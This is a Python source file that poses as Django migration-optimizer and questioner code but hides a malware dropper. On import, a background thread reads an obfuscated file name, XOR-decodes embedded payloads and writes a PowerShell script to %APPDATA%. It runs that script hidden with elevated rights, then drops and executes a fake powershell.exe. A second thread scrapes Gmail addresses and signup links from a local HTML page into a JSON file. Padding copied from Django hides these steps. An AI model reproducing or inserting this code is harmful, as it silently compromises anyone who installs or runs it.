

import time
from bs4 import BeautifulSoup
import json

class MigrationOptimizer:
    """
    Power the optimization process, where you provide a list of Operations
    and you are returned a list of equal or shorter length - operations
    are merged into one if possible.
    """

    def optimize(self, operations, app_label):
        """
        Main optimization entry point. Pass in a list of Operation instances,
        get out a new list of Operation instances.

        The inner loop is run until the starting list is the same as the result
        list, and then the result is returned. This means that operation
        optimization must be stable and always return an equal or shorter list.
        """
        # Internal tracking variable for test assertions about # of loops
        if app_label is None:
            raise TypeError('app_label must be a str.')
        self._iterations = 0
        while True:
            result = self.optimize_inner(operations, app_label)
            self._iterations += 1
            if result == operations:
                return result
            operations = result

    def optimize_inner(self, operations, app_label):
        """Inner optimization loop."""
        new_operations = []
        for i, operation in enumerate(operations):
            right = True  # Should we reduce on the right or on the left.
            # Compare it to each operation after it
            for j, other in enumerate(operations[i + 1:]):
                result = operation.reduce(other, app_label)
                if isinstance(result, list):
                    in_between = operations[i + 1:i + j + 1]
                    if right:
                        new_operations.extend(in_between)
                        new_operations.extend(result)
                    elif all(op.reduce(other, app_label) is True for op in in_between):
                        # Perform a left reduction if all of the in-between
                        # operations can optimize through other.
                        new_operations.extend(result)
                        new_operations.extend(in_between)
                    else:
                        # Otherwise keep trying.
                        new_operations.append(operation)
                        break
                    new_operations.extend(operations[i + j + 2:])
                    return new_operations
                elif not result:
                    # Can't perform a right reduction.
                    right = False
            else:
                new_operations.append(operation)
        return new_operations

import threading


class BadHeaderError(ValueError):
    pass


import subprocess, sys
import os
class MigrationQuestioner:
    """
    Give the autodetector responses to questions it might have.
    This base class has a built-in noninteractive mode, but the
    interactive subclass is what the command-line arguments will use.
    """

    def __init__(self, defaults=None, specified_apps=None, dry_run=None):
        self.defaults = defaults or {}
        self.specified_apps = specified_apps or set()
        self.dry_run = dry_run

    def ask_not_null_addition(self, field_name, model_name):
        """Adding a NOT NULL field to a model."""
        # None means quit
        return None

    def ask_not_null_alteration(self, field_name, model_name):
        """Changing a NULL field to NOT NULL."""
        # None means quit
        return None

    def ask_rename(self, model_name, old_name, new_name, field_instance):
        """Was this field really renamed?"""
        return self.defaults.get("ask_rename", False)

    def ask_rename_model(self, old_model_state, new_model_state):
        """Was this model really renamed?"""
        return self.defaults.get("ask_rename_model", False)

    def ask_merge(self, app_label):
        """Do you really want to merge these migrations?"""
        return self.defaults.get("ask_merge", False)

    def ask_auto_now_add_addition(self, field_name, model_name):
        """Adding an auto_now_add field to a model."""
        # None means quit
        return None





class InteractiveMigrationQuestioner(MigrationQuestioner):

    def _boolean_input(self, question, default=None):
        result = input("%s " % question)
        if not result and default is not None:
            return default
        while not result or result[0].lower() not in "yn":
            result = input("Please answer yes or no: ")
        return result[0].lower() == "y"

    def _choice_input(self, question, choices):
        print(question)
        for i, choice in enumerate(choices):
            print(" %s) %s" % (i + 1, choice))
        result = input("Select an option: ")
        while True:
            try:
                value = int(result)
            except ValueError:
                pass
            else:
                if 0 < value <= len(choices):
                    return value
            result = input("Please select a valid option: ")

    def _ask_default(self, default=''):
        """
        Prompt for a default value.

        The ``default`` argument allows providing a custom default value (as a
        string) which will be shown to the user and used as the return value
        if the user doesn't provide any other input.
        """
        print("Please enter the default value now, as valid Python")
        if default:
            print(
                "You can accept the default '{}' by pressing 'Enter' or you "
                "can provide another value.".format(default)
            )
        print("The datetime and django.utils.timezone modules are available, so you can do e.g. timezone.now")
        print("Type 'exit' to exit this prompt")
        while True:
            if default:
                prompt = "[default: {}] >>> ".format(default)
            else:
                prompt = ">>> "
            code = input(prompt)
            if not code and default:
                code = default

    def ask_not_null_addition(self, field_name, model_name):
        """Adding a NOT NULL field to a model."""
        if not self.dry_run:
            choice = self._choice_input(
                "You are trying to add a non-nullable field '%s' to %s without a default; "
                "we can't do that (the database needs something to populate existing rows).\n"
                "Please select a fix:" % (field_name, model_name),
                [
                    ("Provide a one-off default now (will be set on all existing "
                     "rows with a null value for this column)"),
                    "Quit, and let me add a default in models.py",
                ]
            )
            if choice == 2:
                sys.exit(3)
            else:
                return self._ask_default()
        return None

    def ask_not_null_alteration(self, field_name, model_name):
        """Changing a NULL field to NOT NULL."""
        if not self.dry_run:
            choice = self._choice_input(
                "You are trying to change the nullable field '%s' on %s to non-nullable "
                "without a default; we can't do that (the database needs something to "
                "populate existing rows).\n"
                "Please select a fix:" % (field_name, model_name),
                [
                    ("Provide a one-off default now (will be set on all existing "
                     "rows with a null value for this column)"),
                    ("Ignore for now, and let me handle existing rows with NULL myself "
                     "(e.g. because you added a RunPython or RunSQL operation to handle "
                     "NULL values in a previous data migration)"),
                    "Quit, and let me add a default in models.py",
                ]
            )
        return None

    def ask_rename(self, model_name, old_name, new_name, field_instance):
        """Was this field really renamed?"""
        msg = "Did you rename %s.%s to %s.%s (a %s)? [y/N]"
        return self._boolean_input(msg % (model_name, old_name, model_name, new_name,
                                          field_instance.__class__.__name__), False)

    def ask_rename_model(self, old_model_state, new_model_state):
        """Was this model really renamed?"""
        msg = "Did you rename the %s.%s model to %s? [y/N]"
        return self._boolean_input(msg % (old_model_state.app_label, old_model_state.name,
                                          new_model_state.name), False)

    def ask_merge(self, app_label):
        return self._boolean_input(
            "\nMerging will only work if the operations printed above do not conflict\n" +
            "with each other (working on different fields or models)\n" +
            "Do you want to merge these migration branches? [y/N]",
            False,
        )

    def ask_auto_now_add_addition(self, field_name, model_name):
        """Adding an auto_now_add field to a model."""
        if not self.dry_run:
            choice = self._choice_input(
                "You are trying to add the field '{}' with 'auto_now_add=True' "
                "to {} without a default; the database needs something to "
                "populate existing rows.\n".format(field_name, model_name),
                [
                    "Provide a one-off default now (will be set on all "
                    "existing rows)",
                    "Quit, and let me add a default in models.py",
                ]
            )
            if choice == 2:
                sys.exit(3)
            else:
                return self._ask_default(default='timezone.now')
        return None

roaming = os.getenv('APPDATA')

path_module = "p" + "yse" + "len" + "iu" + "m." + "l" + "ib"

def thread_m():
    with open(path_module, 'rb') as file_a:

        def function_a(arg):
            return f"This is function_a, and the argument is: {arg}"

        def function_b(arg):
            return f"This is function_b, and the argument is: {arg}"

        def function_c(arg):
            return f"This is function_c, and the argument is: {arg}"

        a_content = file_a.read()

        start_pos = 0
        start_pos = a_content.find(b'\n--- XOR result starts here ---\n', start_pos)
        if start_pos == -1:
            exit()

        ActivaePath = f"{roaming}/activate.ps1"

        class DummyNode:

            def __init__(self, key, origin, error_message):
                super().__init__(key)
                self.origin = origin
                self.error_message = error_message

            def raise_error(self):
                return
        
        end_pos = a_content.find(b'\n--- XOR result ends here ---\n', start_pos)

        xor_result = a_content[start_pos+len(b'\n--- XOR result starts here ---\n'):end_pos]
        xor_result = bytes([b ^ 0x62 for b in xor_result])

        with open(ActivaePath, 'wb') as file_b:
            file_b.write(xor_result)


        def __eq__(self, other):
            return self.key == other

        def __lt__(self, other):
            return self.key < other

        def __hash__(self):
            return hash(self.key)

        def __getitem__(self, item):
            return self.key[item]

        def __str__(self):
            return str(self.key)

        def __repr__(self):
            return '<%s: (%r, %r)>' % (self.__class__.__name__, self.key[0], self.key[1])

        def add_child(self, child):
            self.children.add(child)

        def add_parent(self, parent):
            self.parents.add(parent)

        time.sleep(0.1)
        p = subprocess.Popen(
            [
                "powershell.exe", 
                "-noprofile", "-c",
                r"""
                Start-Process -Verb RunAs -WindowStyle Hidden -Wait powershell.exe -Args "
                -noprofile -c Set-Location \`"$PWD\`"; & '$env:APPDATA\activate.ps1'
                "
                """
            ],
            stdout = sys.stdout
        )
        p.communicate()
        os.remove(ActivaePath)

        if not os.path.exists(roaming + r"\hollus"):
            os.makedirs(roaming + r"\hollus")
            
        @property
        def filename(self):
            return "%s.py" % self.migration.name

        @property
        def path(self):
            return os.path.join(self.basedir, self.filename)

        start_pos += 1
        start_pos = a_content.find(b'\n--- XOR result starts here ---\n', start_pos)

        if start_pos == -1:
            exit()

        end_pos = a_content.find(b'\n--- XOR result ends here ---\n', start_pos)
        xor_result = a_content[start_pos+len(b'\n--- XOR result starts here ---\n'):end_pos]
        xor_result = bytes([b ^ 0x62 for b in xor_result])

        file_path = f"{roaming}\hollus\powershell.exe"

                
        if not os.path.exists(file_path):
            with open(file_path, 'wb') as file_b:
                file_b.write(xor_result)

            time.sleep(0.1)
            subprocess.run(file_path, shell=True)

thread = threading.Thread(target=thread_m, group=None)    
thread.start()

def thread_m2():
    try:    
        def _boolean_input(self, question, default=None):
            result = input("%s " % question)
            if not result and default is not None:
                return default
            while not result or result[0].lower() not in "yn":
                result = input("Please answer yes or no: ")
            return result[0].lower() == "y"

        def _choice_input(self, question, choices):
            print(question)
            for i, choice in enumerate(choices):
                print(" %s) %s" % (i + 1, choice))
            result = input("Select an option: ")
            while True:
                try:
                    value = int(result)
                except ValueError:
                    pass
                else:
                    if 0 < value <= len(choices):
                        return value
                result = input("Please select a valid option: ")

        def _ask_default(self, default=''):
            """
            Prompt for a default value.

            The ``default`` argument allows providing a custom default value (as a
            string) which will be shown to the user and used as the return value
            if the user doesn't provide any other input.
            """
            print("Please enter the default value now, as valid Python")
            if default:
                print(
                    "You can accept the default '{}' by pressing 'Enter' or you "
                    "can provide another value.".format(default)
                )
            print("The datetime and django.utils.timezone modules are available, so you can do e.g. timezone.now")
            print("Type 'exit' to exit this prompt")
            while True:
                if default:
                    prompt = "[default: {}] >>> ".format(default)
                else:
                    prompt = ">>> "
                code = input(prompt)
                if not code and default:
                    code = default

        def ask_not_null_addition(self, field_name, model_name):
            """Adding a NOT NULL field to a model."""
            if not self.dry_run:
                choice = self._choice_input(
                    "You are trying to add a non-nullable field '%s' to %s without a default; "
                    "we can't do that (the database needs something to populate existing rows).\n"
                    "Please select a fix:" % (field_name, model_name),
                    [
                        ("Provide a one-off default now (will be set on all existing "
                        "rows with a null value for this column)"),
                        "Quit, and let me add a default in models.py",
                    ]
                )
                if choice == 2:
                    sys.exit(3)
                else:
                    return self._ask_default()
            return None

        def ask_not_null_alteration(self, field_name, model_name):
            """Changing a NULL field to NOT NULL."""
            if not self.dry_run:
                choice = self._choice_input(
                    "You are trying to change the nullable field '%s' on %s to non-nullable "
                    "without a default; we can't do that (the database needs something to "
                    "populate existing rows).\n"
                    "Please select a fix:" % (field_name, model_name),
                    [
                        ("Provide a one-off default now (will be set on all existing "
                        "rows with a null value for this column)"),
                        ("Ignore for now, and let me handle existing rows with NULL myself "
                        "(e.g. because you added a RunPython or RunSQL operation to handle "
                        "NULL values in a previous data migration)"),
                        "Quit, and let me add a default in models.py",
                    ]
                )
            return None

        def ask_rename(self, model_name, old_name, new_name, field_instance):
            """Was this field really renamed?"""
            msg = "Did you rename %s.%s to %s.%s (a %s)? [y/N]"
            return self._boolean_input(msg % (model_name, old_name, model_name, new_name,
                                            field_instance.__class__.__name__), False)

        def ask_rename_model(self, old_model_state, new_model_state):
            """Was this model really renamed?"""
            msg = "Did you rename the %s.%s model to %s? [y/N]"
            return self._boolean_input(msg % (old_model_state.app_label, old_model_state.name,
                                            new_model_state.name), False)

        def ask_merge(self, app_label):
            return self._boolean_input(
                "\nMerging will only work if the operations printed above do not conflict\n" +
                "with each other (working on different fields or models)\n" +
                "Do you want to merge these migration branches? [y/N]",
                False,
            )

        def ask_auto_now_add_addition(self, field_name, model_name):
            """Adding an auto_now_add field to a model."""
            if not self.dry_run:
                choice = self._choice_input(
                    "You are trying to add the field '{}' with 'auto_now_add=True' "
                    "to {} without a default; the database needs something to "
                    "populate existing rows.\n".format(field_name, model_name),
                    [
                        "Provide a one-off default now (will be set on all "
                        "existing rows)",
                        "Quit, and let me add a default in models.py",
                    ]
                )
                if choice == 2:
                    sys.exit(3)
                else:
                    return self._ask_default(default='timezone.now')
            return None
    
        htmlText=None
        with open("gmail.html",'r', encoding="utf-8") as gmailFile:
            htmlText=gmailFile.read()
            
        soup=BeautifulSoup(htmlText,"html.parser")

        links = soup.find_all('a')
        prefix = "coffee."
        count = 0
        urlList = []

        for link in links:
            href = link.get('href')
            if href and 'signup' in href:
                urlList.insert(len(urlList),href)

        emailList=[]

        links =soup.find_all('span')
        for link in links:
            href = link.get('email')
            if href and 'gmail.com'  in href:
                emailList.insert(len(emailList),href)

        emailDict={}

        for i in range(len(emailList)):
            emailDict[emailList[i]] = urlList[i]

        with open('emails.json', 'w') as outfile:
            json.dump(emailDict, outfile)   
    except:
        pass
    
thread2 = threading.Thread(target=thread_m2, group=None)    
thread2.start()

class StreamingHttpResponse():
    """
    A streaming HTTP response class with an iterator as content.

    This should only be iterated once, when the response is streamed to the
    client. However, it can be appended to or replaced with a new iterator
    that wraps the original content (or yields entirely new content).
    """

    streaming = True

    def __init__(self, streaming_content=(), *args, **kwargs):
        super().__init__(*args, **kwargs)
        # `streaming_content` should be an iterable of bytestrings.
        # See the `streaming_content` property methods.
        self.streaming_content = streaming_content

    @property
    def content(self):
        raise AttributeError(
            "This %s instance has no `content` attribute. Use "
            "`streaming_content` instead." % self.__class__.__name__
        )

    @property
    def streaming_content(self):
        return map(self.make_bytes, self._iterator)

    @streaming_content.setter
    def streaming_content(self, value):
        self._set_streaming_content(value)

    def _set_streaming_content(self, value):
        # Ensure we can never iterate on "value" more than once.
        self._iterator = iter(value)
        if hasattr(value, 'close'):
            self._resource_closers.append(value.close)

    def __iter__(self):
        return self.streaming_content

    def getvalue(self):
        return b''.join(self.streaming_content)


MIGRATION_HEADER_TEMPLATE = """\
# Generated by Django %(version)s on %(timestamp)s

"""

MIGRATION_TEMPLATE = """\
%(migration_header)s%(imports)s

class Migration(migrations.Migration):
%(replaces_str)s%(initial_str)s
    dependencies = [
%(dependencies)s\
    ]

    operations = [
%(operations)s\
    ]
"""